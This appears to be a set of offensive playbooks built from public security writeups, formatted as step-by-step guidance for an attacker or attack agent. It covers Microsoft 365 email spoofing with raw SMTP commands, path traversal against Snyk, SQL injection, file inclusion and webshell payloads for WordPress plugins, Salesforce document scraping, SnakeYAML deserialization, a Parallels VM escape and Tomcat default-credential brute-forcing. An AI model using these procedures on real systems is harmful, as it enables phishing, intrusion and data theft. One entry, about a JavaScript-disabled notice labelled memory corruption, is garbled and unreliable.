applicability_signals: The device is a network printer targeted in a competition like Pwn2Own.
Printer boots from NOR Flash or eMMC storage.
skip_if: The device firmware is updated and patched against known vulnerabilities.
The printer does not have easily accessible flash memory for dumping.

recon_steps: Step 1: Identify the type of flash memory (e.g., W25Q16JV) and its physical location on the printer's PCB.
Step 2: Locate and confirm the presence of a UART connector on the printer's PCB.
Step 3: Dump the entire content of the flash memory using a hardware programmer (e.g., CH341A with SOP8 clip) and flashrom.
Step 4: Analyze the dumped binary with `binwalk` to identify file systems, executables, and other data structures.
Step 5: Load the binary into a disassembler (e.g., IDA Pro) to identify the bootloader and firmware addresses.
Step 6: Deduce the firmware's loading address by analyzing bootloader logic and memory mapping.
attack_steps: Step 1: Reverse engineer the bootloader to understand its initialization process and how it loads the main firmware.
Step 2: Identify potential vulnerabilities within the bootloader or firmware loading mechanism (e.g., buffer overflows, format string bugs, integer overflows).
Step 3: Craft a malicious payload that exploits a vulnerability to achieve code execution.
Step 4: Modify the firmware or bootloader to include the payload, potentially by overwriting specific memory regions.
Step 5: Re-flash the modified firmware/bootloader back onto the device.
Step 6: Trigger the vulnerability to execute the payload on the target printer.
tools_recommended: CH341A programmer
SOP8 clip
flashrom
binwalk
IDA Pro
success_indicators: Successful execution of arbitrary code on the printer, confirmed via debugging output, network callbacks, or observable changes in printer behavior.
failure_indicators: Printer fails to boot after re-flashing the modified firmware, indicating a critical bootloader or firmware corruption. Pivot: Analyze error messages from UART if available, or try a less intrusive modification.

playbooks.impact: Achieve arbitrary code execution on the printer, allowing for persistent access to sensitive documents (scanned or printed), network pivoting, or further compromise of the internal network.
playbooks.key_lesson: When targeting embedded devices like printers, physical access to dump firmware and bootloader is often a necessary first step, followed by detailed reverse engineering to uncover vulnerabilities.

meta.title: Slides

trigger_conditions.when_to_apply: When the target application explicitly states that JavaScript is not available and prompts the user to enable it or switch browsers.
prerequisites: Browser with JavaScript disabled or a browser that is not supported by the target application.
applicability_signals: Presence of text indicating JavaScript is disabled and instructions to enable it.
Error messages related to JavaScript not being available.
skip_if: The target application functions correctly with JavaScript enabled.
The target application does not display messages related to JavaScript availability.

recon_steps: Step 1: Access the target URL with JavaScript disabled in the browser.
Step 2: Observe the response for messages indicating JavaScript is required or disabled.
attack_steps: Step 1: The writeup provides insufficient detail to construct actionable attack steps. The vulnerability category is 'memory corruption' but there is no mention of how to trigger or exploit it in the provided text. The text is purely a user-facing message.
Step 2: Insufficient detail in writeup
Step 3: Insufficient detail in writeup
tools_recommended: Browser developer tools to disable JavaScript.
Burp Suite to capture and analyze requests/responses.
success_indicators: insufficient detail in writeup
failure_indicators: The application loads and functions normally, or displays a different error message that does not relate to JavaScript availability.

playbooks.impact: Insufficient detail in writeup. The category indicates memory corruption, which could lead to crashes, denial of service, or potentially remote code execution, but this is not described.
playbooks.key_lesson: When an application explicitly fails due to JavaScript being disabled, investigate if there are alternative ways to trigger functionality or if the client-side error handling itself can be exploited, especially if the vulnerability category suggests memory corruption.

meta.title: Spoofing Microsoft 365 Like It’s 1995

affected_components: Inbound email delivery to internal users

trigger_conditions.when_to_apply: When an organization uses Microsoft 365 and its email gateway trusts inbound mail from the organization's own domain, enabling direct sending to internal users.
prerequisites: Microsoft 365 subscription and an Exchange Online Plan.
Knowledge of the target domain's MX endpoint (e.g., 'company-com.mail.protection.outlook.com').
Ability to send mail via port 25 (this might be blocked by some networks, but is often open for legitimate mail server interactions).
applicability_signals: Target domain is hosted on Microsoft 365.
The MX record points to an Outlook protection endpoint.
Telnet to port 25 on the MX endpoint is successful.
skip_if: Outbound port 25 is blocked by the attacker's network or the target's firewall.
The target's Microsoft 365 tenant is not configured to allow direct sending from external sources to internal users.
SPF, DKIM, and DMARC policies are strictly enforced and do not permit unauthenticated mail from external sources masquerading as internal senders.

recon_steps: Step 1: Identify the target organization's domain (e.g., 'example.com').
Step 2: Perform an MX record lookup for the target domain to find the smart host/MX endpoint (e.g., 'example-com.mail.protection.outlook.com').
Step 3: Attempt a Telnet connection to the identified MX endpoint on port 25 to confirm reachability and that it's an email server (e.g., 'telnet example-com.mail.protection.outlook.com 25').
Step 4: Check Microsoft's documentation for direct send configurations and prerequisites for Exchange Online.
attack_steps: Step 1: Use a tool capable of sending raw SMTP mail (e.g., `sendmail` command, Python's `smtplib`, or a custom script).
Step 2: Connect to the target domain's MX endpoint (smart host) on port 25.
Step 3: Initiate an SMTP session (EHLO/HELO).
Step 4: Set the 'MAIL FROM' address to an internal address within the target domain (e.g., 'attacker@<TARGET_DOMAIN>').
Step 5: Set the 'RCPT TO' address to an internal recipient within the target domain (e.g., 'victim@<TARGET_DOMAIN>').

Step 6: Send the email content, crafting a spoofed 'From:' header to appear as a trusted internal or external sender (e.g., 'From: "IT Support" <it.support@<TARGET_DOMAIN>>' or 'From: "Boss" <boss@<SOME_TRUSTED_DOMAIN>>').
Step 7: End the SMTP session (QUIT).
payloads_or_patterns:
SMTP commands to send a spoofed email:
EHLO yourdomain.com
MAIL FROM: <SPOOFED_INTERNAL_EMAIL>@<TARGET_DOMAIN>
RCPT TO: <VICTIM_EMAIL>@<TARGET_DOMAIN>
DATA
From: "Sender Name" <<SPOOFED_EMAIL>>
Subject: Urgent Action Required

This is a test email sent via direct send. Please disregard.
.
QUIT
tools_recommended: Netcat or Telnet for port testing.
Python with `smtplib` for programmatic email sending.
Linux `sendmail` command for raw SMTP interaction.
Burp Suite (Proxy tab) to inspect outgoing SMTP traffic if using a client.
success_indicators: The target recipient receives the email in their inbox (or spam/junk folder, but importantly, it reaches the mailbox).
The email's 'From' address and sender display match the spoofed values.
The email originates from the organization's own Microsoft 365 mail servers (as observed by headers, though this is harder for the attacker to verify directly without recipient assistance).
failure_indicators: Connection to port 25 is refused or times out → Network blocking or incorrect MX record.
SMTP server rejects MAIL FROM or RCPT TO commands → Tenant not configured for direct send or recipient invalid.
Email delivered to spam/junk folder with clear warnings → SPF/DKIM/DMARC failures are still partially enforced or reputation issues.
Email is silently dropped (no bounce-back) → Server might be configured for stealthy rejection or greylisting. Try again later or try different spoofed sender addresses.

playbooks.impact: Successful spoofing allows attackers to send phishing emails to internal users that bypasses many standard perimeter defenses, increasing the likelihood of credential harvesting, malware delivery, or social engineering attacks. The email appears to come from a trusted internal or external source, making it more convincing.
playbooks.key_lesson: Leverage Microsoft 365's 'direct send' feature via port 25 on the MX endpoint to bypass common email security checks and spoof internal recipients with high confidence.

meta.title: Generation of 'Choice Return Codes encryption' Public Key and 'Election' Public Key may be influenced by a malicious voting server

trigger_conditions.when_to_apply: This technique applies when the voting server is considered untrustworthy or compromised, and the system generates 'Election' Public Keys based on potentially influenced Control Component public keys.
prerequisites: Attacker has control over or can influence the voting server.
The system generates 'Election' Public Keys.
Control Components' public keys are provided to the SDM.
applicability_signals: The presence of a 'Voting Server' component that is explicitly stated as untrustworthy.
The generation of 'Election' Public Keys or 'Choice Return Codes encryption' Public Keys.
Public keys from 'Control Components' being used in key generation processes.
skip_if: The voting server is verifiably trusted.
The key generation process does not involve potentially influenced Control Component public keys.

recon_steps: Step 1: Analyze the e-voting system's architecture documentation or code (if available) to understand the roles of the Voting Server, Control Components, and SDM.
Step 2: Identify the specific endpoints or functions responsible for generating 'Election' Public Keys and 'Choice Return Codes encryption' Public Keys.
Step 3: Determine how Control Components' public keys are communicated to the SDM or the component responsible for generating these election keys.
attack_steps: Step 1: As a malicious voting server, provide a specific, crafted combination of Control Components' public keys to the SDM.
Step 2: Trigger the generation of the 'Election' Public Key (EL pk).
Step 3: Observe the properties and validity of the generated 'Election' Public Key.
Step 4: (Optional) Trigger the generation of 'Choice Return Codes encryption' Public Keys and analyze them similarly.
payloads_or_patterns: Crafted public keys for Control Components, designed to influence the final 'Election' Public Key generation. (Specific payloads are highly dependent on the cryptographic primitives and key generation algorithms used, which are not detailed in the writeup.)
tools_recommended: Custom scripts for generating and substituting public keys.
Cryptographic analysis tools to verify the properties of generated keys.
success_indicators: The generated 'Election' Public Key is invalid or does not comply with the actual contributions from the four different Control Components, preventing ballot box decryption.
The system's election tally phase fails due to un-decryptable ballot boxes.
failure_indicators: The generated 'Election' Public Key is always valid and consistent with the actual contributions, regardless of the provided Control Component keys. This may indicate strong integrity checks are in place at the key generation stage. Pivot: Investigate the integrity checks themselves for weaknesses.
A 4xx or 5xx error is returned when attempting to influence the key generation process, suggesting input validation or access controls prevent this manipulation.

playbooks.impact: Prevention of ballot box decryption during the tally phase, rendering the election event useless. This impacts the availability and integrity of the election process by making votes unrecoverable.
playbooks.key_lesson: Always validate the integrity of public keys used in critical cryptographic operations, especially when they are derived from components that might be untrusted or influenced by an attacker.

meta.title: Pre-hijacked accounts: An Empirical Study of Security Failures in User Account Creation on the Web
meta.programs: Dropbox, Meta / Facebook, LinkedIn, WordPress, Zoom

target_profile.technology: Web Applications with User Account Creation Features
affected_components: User account creation and recovery flows
tech_stack_fingerprints: Any web application that allows new user registrations

trigger_conditions.when_to_apply: When a web application allows users to create new accounts and has a mechanism for account recovery or password reset that relies on email verification or unique identifiers.
prerequisites: Attacker can register an account or trigger an account recovery flow.
The target application uses email for verification or account recovery.
applicability_signals: User registration endpoint exists.
Email address is used for account verification or password reset.
Unique identifiers (e.g., user IDs, tokens) are generated and sent to the user.
skip_if: Account creation requires multi-factor authentication that cannot be bypassed.
Password reset emails are not sent or are not accessible to the attacker.
The application uses a secure and robust method for email verification that prevents manipulation of registration or recovery processes.

recon_steps: Step 1: Identify web applications that allow user account creation.
Step 2: Analyze the account creation and password reset/recovery flows for each identified application. Look for how email addresses are handled and verified.
Step 3: Observe if unique identifiers (e.g., verification tokens, reset tokens) are generated and sent via email.
attack_steps: Step 1: On the target web application, initiate the account creation process.
Step 2: When prompted for an email address, provide an email address that you control and can monitor.

Step 3: If the application sends a verification email, attempt to intercept or predict the verification token. If the application allows account recovery, attempt to trigger a password reset and intercept/predict the reset token.
Step 4: If a verification or reset token is obtained, use it to activate the account or reset the password, thereby gaining control of the newly created or recovered account.
payloads_or_patterns: Attempt to submit a registration request with a controlled email address.
If applicable, use an account recovery flow with a controlled email address to trigger a password reset token.
Use Burp Suite or similar tools to intercept and analyze registration/recovery emails and associated tokens.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, and analyzing responses to identify token generation patterns.
Custom scripts: To automate the process of account registration and token validation across multiple targets.
success_indicators: Successful account activation or password reset using an intercepted/predicted token.
Gaining administrative or user access to an account that was not intended to be controlled by the attacker.
failure_indicators: Verification or reset tokens expire quickly or are single-use and cannot be obtained/predicted.
The application enforces strong email verification mechanisms that prevent pre-hijacking.
Account creation/recovery emails are not delivered or are filtered by spam filters.

playbooks.impact: Attacker can take over newly created accounts or accounts that are being recovered, leading to unauthorized access, data theft, or further exploitation of the compromised account.
playbooks.key_lesson: Always scrutinize the email verification and account recovery mechanisms for weaknesses, particularly how unique tokens are generated, transmitted, and validated to prevent pre-hijacking of accounts.

meta.title: Leaking Your GitHub Repositories With Snyk Code

trigger_conditions.when_to_apply: When the target application exposes an endpoint that retrieves file content based on a user-supplied path, and this path is used in a backend request to fetch data from a source like GitHub.
prerequisites: An account with Snyk and access to a Snyk Code project.
Knowledge of the target repository name and a file path within it.
applicability_signals: An API endpoint exists that accepts a 'path' parameter to retrieve file content.
The API response returns file content or an error message related to file access.
skip_if: The 'path' parameter is strictly validated and does not allow directory traversal characters.
The backend request to fetch file content does not use a user-controlled variable or does not interact with external file systems/APIs.

recon_steps: Step 1: Log in to Snyk and navigate to Snyk Code findings for a project.
Step 2: Open browser developer tools and observe network requests made when viewing code snippets or file contents.
attack_steps: Step 1: Identify the POST request to `/org/<org_id>/project/<project_id>/sast-issues/<issue_id>/file` with a JSON body containing a `path` parameter.
Step 2: Modify the `path` parameter to include directory traversal sequences (e.g., `../../../../`).
Step 3: Change the `path` to target specific files in other repositories, such as `../../<target_repo_name>/<file_path>`.
Step 4: Analyze the response to extract sensitive file content or confirm access to unintended files.
payloads_or_patterns:
POST /org/<org_id>/project/<project_id>/sast-issues/<issue_id>/file HTTP/1.1
Host: app.snyk.io
Content-Type: application/json

{"path": "../../<target_repo_name>/<file_path>"}
tools_recommended: Burp Suite: To intercept and modify the POST request to the affected endpoint.
Browser Developer Tools: To observe initial network requests and responses.
success_indicators: The response contains the content of a file from a different, potentially private, GitHub repository.
The response indicates successful retrieval of a file that was not part of the imported Snyk project.
failure_indicators: A 400 or 403 error code, or a response indicating the file was not found, suggesting the path traversal was blocked.
Response still contains content only from the originally intended project, indicating the path parameter is not being used for file retrieval from external sources.

playbooks.impact: Disclosure of sensitive files from private GitHub repositories that were not explicitly imported into Snyk by the user, potentially including credentials, API keys, and proprietary code.
playbooks.key_lesson: When an application exposes functionality to read files based on a user-controlled path, test for path traversal to access files outside the intended scope, especially when the backend interacts with external file systems or APIs.

meta.title: Research: Auditing WordPress Plugins

trigger_conditions.when_to_apply: When auditing WordPress plugins, especially older or unmaintained ones, to identify potential security vulnerabilities like SQL injection, Local File Inclusion, or Remote Code Execution.
prerequisites: Access to the source code of WordPress plugins.
A WordPress environment for testing (local or remote).
Knowledge of WordPress plugin structure, hooks, and common vulnerabilities.
applicability_signals: Presence of plugins that have not been updated in several years.
Plugins with user-supplied input that is not properly sanitized or validated.
File inclusion or execution functions being used without proper checks.
skip_if: All tested plugins are actively maintained and have robust security measures.
The WordPress installation is behind a WAF that effectively blocks common exploit patterns.

recon_steps: Step 1: Scrape and index WordPress plugin metadata, including release dates, last updated dates, version numbers, and file paths from the WordPress SVN server or other repositories.
Step 2: Filter plugins to prioritize those not updated in the last two years, as these are more likely to contain unpatched vulnerabilities.
Step 3: Download the source code of selected plugins for static analysis.
Step 4: Identify potential sources (user input, external data) and sinks (database queries, file operations, command execution) within the plugin code.
attack_steps: Step 1: For identified potential SQL injection points, craft payloads using SQL meta-characters (e.g., single quotes, comments) and append them to vulnerable parameters in HTTP requests targeting the plugin's functionality. Example: `GET /wp-content/plugins/<plugin_name>/<vulnerable_script>.php?param=' OR 1=1 --`

Step 2: For potential LFI, attempt to include common sensitive files (e.g., `/etc/passwd`, `../../wp-config.php`) by manipulating file path parameters. Example: `GET /wp-content/plugins/<plugin_name>/<vulnerable_script>.php?file=../../../../etc/passwd%00`

Step 3: For potential RCE, if file upload functionality is present and insecure, attempt to upload a webshell. If command execution functions are directly used with user input, craft payloads that execute system commands. Example: `POST /wp-content/plugins/<plugin_name>/upload.php` with a malicious file, or `GET /wp-content/plugins/<plugin_name>/<vulnerable_script>.php?cmd=id`
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, and for scanning for vulnerabilities.
Sqlmap: For automated SQL injection detection and exploitation.
Static analysis tools (e.g., PHPStan, Psalm): To identify potential vulnerabilities in plugin code.
WordPress CLI: For managing WordPress installations and plugins.
success_indicators: SQL Injection: Error messages revealing database structure, successful retrieval of data, or time-based blind responses.
LFI: Successful inclusion and display of sensitive file contents (e.g., `/etc/passwd`, `wp-config.php`).
RCE: Execution of arbitrary commands on the server, confirmed by observing command output or server behavior changes (e.g., callback to attacker-controlled server).
failure_indicators: All SQL injection attempts result in syntax errors or no observable difference in response → input is likely properly escaped or parameterized. Try fuzzing for different SQL injection techniques.
LFI attempts return 404 or file not found errors → path traversal is blocked or the specified files are not present. Try different path traversal depths or alternative file paths.
RCE payloads are not executed or are sanitized → command execution is not directly possible. Re-evaluate the plugin for other vulnerability types.

playbooks.impact: Unauthorized access to sensitive data (e.g., database credentials, user information) via SQL injection, execution of arbitrary code on the server leading to full system compromise via RCE, or access to server-side files via LFI.
playbooks.key_lesson: Prioritize auditing older, unmaintained WordPress plugins as they are statistically more likely to contain exploitable vulnerabilities like SQLi, LFI, and RCE due to outdated security practices.

meta.title: How I was able to access IBM internal documents

trigger_conditions.when_to_apply: When a Salesforce community is used by an organization and is configured to expose document listing and download functionalities via Aura endpoints.
prerequisites: The target subdomain points to a Salesforce live.siteforce.com CNAME.
The attacker has credentials to log in to the Salesforce community (any authenticated user).
applicability_signals: The presence of the /s/sfsites/aura endpoint that accepts POST requests.

The ability to craft a POST request to the /s/sfsites/aura endpoint with specific descriptors like 'serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems'.
skip_if: The Salesforce community requires administrative privileges for access.
The /s/sfsites/aura endpoint does not respond to valid requests or returns errors for document listing actions.

recon_steps: Step 1: Identify subdomains pointing to Salesforce CNAMEs like *.force.com, *.secure.force.com, *.live.siteforce.com using tools like cngo and chaos.projectdiscovery.io.
Step 2: For identified subdomains (e.g., weathercommunity.ibm.com), verify it points to a Salesforce live.siteforce.com CNAME.
Step 3: Attempt to authenticate to the Salesforce community with valid user credentials to check for exposed functionalities.
attack_steps: Step 1: Send a POST request to the /s/sfsites/aura endpoint with a carefully crafted JSON payload designed to retrieve a list of documents.
Step 2: In the payload, set 'entityNameOrId' to 'ContentDocument' and adjust 'pageSize' and 'currentPage' to retrieve a large number of document IDs.
Step 3: Extract document IDs from the response, focusing on IDs that start with '069' (as per the writeup).
Step 4: For each extracted document ID, construct a download URL using the format /sfc/servlet.shepherd/document/download/<ID>.
Step 5: Download the documents using tools like wget or by directly accessing the constructed URLs in a browser.
tools_recommended: cngo: To find CNAMEs of subdomains.
chaos.projectdiscovery.io: For subdomain discovery.
Burp Suite Repeater: To modify and resend the POST request.
Bash script with wget: To automate the download of multiple documents.
success_indicators: Receiving a successful HTTP 200 response from the /s/sfsites/aura endpoint with a JSON body containing a list of document IDs.
Successfully downloading internal IBM documents (images, in this case) using the /sfc/servlet.shepherd/document/download/<ID> endpoint.
failure_indicators: Receiving 403 Forbidden or other error codes for the POST request to /s/sfsites/aura: The API might be restricted or the payload is malformed.
Receiving empty or no document IDs in the response: The 'ContentDocument' entity might not be accessible or the user lacks permissions.
Receiving 404 Not Found or access denied for download URLs: The document IDs might be invalid or access control is enforced at the download level.

playbooks.impact: Unauthorized access to internal IBM documents, including sensitive information. This can lead to data breaches, reputational damage, and potential compliance violations.
playbooks.key_lesson: When targeting Salesforce communities, always investigate API endpoints like /s/sfsites/aura for functionalities that list or retrieve sensitive data, especially when authenticated as a regular user.

meta.title: CVE-2022-21404: Another Story Of Developers Fixing Vulnerabilities Unknowingly Because Of CodeQL

trigger_conditions.when_to_apply: When the target application uses SnakeYAML for YAML parsing and does not explicitly use a SafeConstructor.
prerequisites: Target application is using Oracle Helidon.
Target application processes user-controlled YAML input.
applicability_signals: Code snippet showing `Yaml yaml = new Yaml(); yamlMap = yaml.loadAs(reader, Map.class);` without explicit SafeConstructor usage.
skip_if: YAML parsing is configured to use SafeConstructor explicitly.
SnakeYAML version used is patched against known deserialization vulnerabilities and the specific gadget chains are not effective.

recon_steps: Step 1: Identify if the target application uses Oracle Helidon.
Step 2: Analyze network traffic or source code to confirm the usage of SnakeYAML for YAML parsing.
Step 3: Examine the YAML parsing logic to determine if `SafeConstructor` is being used.
attack_steps: Step 1: Craft a YAML payload designed to exploit the insecure deserialization vulnerability via `ScriptEngineManager` and `URLClassLoader`.
Step 2: Send the crafted YAML payload to an endpoint that processes user-supplied YAML input.
Step 3: Monitor for a callback to a controlled server (e.g., Burp Collaborator) or observe any resulting errors or unexpected behavior.
tools_recommended: Burp Suite: To capture and modify requests, and to host a collaborator client for detecting callbacks.
Custom script: To automate the generation and sending of malicious YAML payloads.
success_indicators: A callback is received at the attacker's controlled server (<EVIL_SERVER>) from the target application.
An exception related to class loading or script execution occurs in the target application's response.
Unexpected behavior or application crash indicative of code execution.
failure_indicators: The YAML payload is rejected with a parsing error without any callback or unusual behavior (e.g., `Invalid tag name: !` errors).
The application returns a generic error message without revealing specific deserialization issues.
No callback is received and no unusual behavior is observed after repeated attempts with different payloads (suggesting sanitization or a different gadget chain is required).

playbooks.impact: Remote Code Execution (RCE) on the server hosting the Oracle Helidon application.
playbooks.key_lesson: Always verify if YAML parsing libraries like SnakeYAML are configured with `SafeConstructor` when processing untrusted input, as default configurations can be vulnerable to deserialization attacks leading to RCE.

meta.title: Exploiting an Unbounded memcpy in Parallels Desktop: A Pwn2Own 2021 Guest-to-Host Virtualization Escape

affected_components: Guest Tools (prl_tg, prl_eth, prl_fs, prl_fs_freeze, prl_vid)
tech_stack_fingerprints: Guest OS with Parallels Tools installed
Kernel modules: prl_tg, prl_eth, prl_fs, prl_fs_freeze, prl_vid

trigger_conditions.when_to_apply: When an attacker has privileged code execution within a guest operating system and can interact with Parallels Desktop's host-side components through the guest tools interface.
prerequisites: Attacker has code execution in the guest OS (e.g., via kernel module)
Parallels Tools are installed in the guest OS
applicability_signals: Ability to send requests to the 'toolgate' interface via guest kernel modules (e.g., prl_tg)
Presence of opcode definitions in toolgate header files
Observable communication channels between guest and host for features like shared folders, copy-paste, drag-and-drop
skip_if: No code execution in the guest OS
Parallels Tools are not installed or not functioning
The target is a standalone application without virtualization features

recon_steps: Step 1: Identify guest OS kernel modules related to Parallels Tools (e.g., prl_tg, prl_eth, prl_fs).
Step 2: Obtain and review source code for these kernel modules (if available, e.g., for Linux guests) to understand the interface with the host.
Step 3: Analyze header files (e.g., for prl_tg) to identify opcodes and the types of operations supported by the toolgate interface.
attack_steps: Step 1: Identify a specific toolgate operation (opcode) that takes user-controlled input that is copied into a buffer on the host side.
Step 2: Craft a guest-side request targeting the identified opcode with crafted input designed to trigger an unbounded `memcpy` operation.
Step 3: Execute the crafted request from the guest OS.
Step 4: Observe for signs of memory corruption or arbitrary code execution in the `prl_vm_app` process on the host system.
payloads_or_patterns: Crafted guest OS calls to the toolgate interface using specific opcodes and oversized data buffers.
Exploitation of `memcpy` vulnerability by providing a size argument larger than the destination buffer.
tools_recommended: Debugger (e.g., GDB) attached to `prl_vm_app` on the host to observe memory corruption.
Guest OS kernel module development tools to craft and inject malicious modules.
Reverse engineering tools (e.g., IDA Pro) to analyze `prl_vm_app`.
success_indicators: Crash of the `prl_vm_app` process on the host due to memory corruption.
Execution of shellcode or a proof-of-concept payload on the host operating system.
Observation of arbitrary code execution in the host process via debugger or external signals.
failure_indicators: Requests to the toolgate interface are rejected with error codes or return unexpected data.
No observable memory corruption or crashes in the host process.
Error: 'insufficient detail in writeup' regarding specific opcodes and payloads.

playbooks.impact: Arbitrary code execution on the host macOS system with the privileges of the Parallels application process, leading to a full guest-to-host virtualization escape.
playbooks.key_lesson: Analyze guest tool interfaces for data handling vulnerabilities, especially when data from the guest is copied into host-side buffers without proper bounds checking.

meta.title: A Tale of Confusing IDOR

trigger_conditions.when_to_apply: When user-specific data is accessed via predictable identifiers in API requests that are not properly authorized.
prerequisites: Attacker must have an authenticated user account.
applicability_signals: API endpoints that accept numeric or string identifiers for user-related resources.
skip_if: API consistently returns 401/403 for requests not belonging to the authenticated user.

recon_steps: Analyze network traffic for authenticated user actions to identify API endpoints and parameters used for accessing user data.
Look for endpoints that use numeric or predictable IDs in the URL or request body for user-specific information.
attack_steps: Step 1: Identify an endpoint that returns user-specific data using an ID. For example, hypothetical GET /api/v1/user/profile?userId=<OWN_USER_ID>.
Step 2: Using the attacker's session token, attempt to change the <OWN_USER_ID> to another user's ID. The writeup does not provide specific IDs or endpoints.
Step 3: Observe the response to determine if data from another user is returned.
payloads_or_patterns: Replace <OWN_USER_ID> with a suspected <OTHER_USER_ID> in requests to user data endpoints.
tools_recommended: Burp Suite: Proxy traffic, identify candidate endpoints, and modify requests.
success_indicators: Receiving a 200 OK response containing data belonging to a different user.
failure_indicators: Receiving a 403 Forbidden or 401 Unauthorized response indicates proper authorization checks are in place.
Receiving a 404 Not Found might indicate an invalid ID or a restrictive endpoint, requiring further enumeration.

playbooks.impact: Unauthorized access to another user's profile data, potentially including sensitive information.
playbooks.key_lesson: Always test parameters that identify user resources (e.g., user IDs, profile IDs) for IDOR vulnerabilities by substituting identifiers from other authenticated users.

meta.title: Variant Cloud Analysis

tech_stack_fingerprints: Tomcat Manager default credentials (e.g., tomcat/tomcat, admin/admin)

trigger_conditions.when_to_apply: When a target is known or suspected to be running Apache Tomcat and its manager interface is accessible on a public IP address.
prerequisites: Target is running Apache Tomcat.
Target has the Tomcat Manager application deployed and accessible.
applicability_signals: HTTP response for a common Tomcat Manager path (e.g., /manager/html or /manager/jmxproxy) returns a 200 status code.
Tomcat Manager login page is observable.
skip_if: Tomcat Manager login page is not accessible.
All common default credentials are rejected.

recon_steps: Step 1: Scan common Tomcat Manager paths (e.g., /manager/html, /manager/jmxproxy) on target IPs to identify running Tomcat instances.
Step 2: Observe HTTP response codes and page content to confirm the presence of a Tomcat Manager interface.
attack_steps: Step 1: Attempt to log in to the Tomcat Manager interface using common default credentials (e.g., tomcat/tomcat, admin/admin, root/root, etc.).
Step 2: If login is successful, proceed to further investigation within the manager interface for potential vulnerabilities or information disclosure.
tools_recommended: Nmap with http-enum script to discover web applications and common paths.
Burp Suite Intruder for brute-forcing default credentials.
success_indicators: Successful login to the Tomcat Manager interface without prior knowledge of credentials.
Observation of the Tomcat Manager dashboard or application list.
failure_indicators: All attempts to log in with default credentials fail, returning 401 Unauthorized or login page redirects.
Custom or strongly protected credentials are in use.

playbooks.impact: Unauthorized access to the Tomcat Manager interface can lead to information disclosure, application deployment/undeployment, and potentially remote code execution depending on the Tomcat version and configuration.
playbooks.key_lesson: Always test for default credentials on web applications, especially for administrative interfaces like Tomcat Manager, even on well-tested targets. Leverage different cloud providers and instance types during recon as they might expose differently configured services.
